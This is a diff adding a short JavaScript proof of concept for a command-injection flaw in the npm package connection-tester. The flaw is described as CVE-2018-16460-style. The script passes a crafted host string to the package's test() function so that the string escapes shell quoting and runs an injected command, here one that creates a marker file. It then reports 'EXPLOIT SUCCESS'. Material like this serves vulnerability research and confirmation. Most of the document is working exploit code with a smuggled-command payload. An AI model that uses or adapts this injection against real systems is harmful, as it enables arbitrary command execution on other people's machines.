@@ -1,0 +1,26 @@
+This confirms the known CVE-2018-16460-style command injection in `connection-tester`: the sync `test()` builds a shell command via `util.format` with unsanitized `host`/`port`/`timeout` and runs it through `child_process.execSync`, so a malicious host string can inject arbitrary shell commands.
+
+```javascript
+'use strict';
+
+const connectionTester = require('./node_modules/connection-tester');
+
+// The synchronous test() path builds a shell command string with
+// util.format('"%s" "%s" %s %s %s', execPath, scriptPath, host, port, timeout)
+// and runs it via child_process.execSync WITHOUT sanitizing host/port/timeout.
+// Supplying a host value that breaks out of the quoted argument lets us
+// inject arbitrary shell commands.
+
+const maliciousHost = '" 127.0.0.1 & touch /tmp/pwned_by_connection_tester & echo "';
+
+const result = connectionTester.test(maliciousHost, 80, 1000);
+
+console.log('Result from connection-tester:', result);
+
+const fs = require('fs');
+if (fs.existsSync('/tmp/pwned_by_connection_tester')) {
+  console.log('EXPLOIT SUCCESS: arbitrary command executed, marker file created.');
+} else {
+  console.log('Marker file not found - check shell quoting for your OS.');
+}
+```
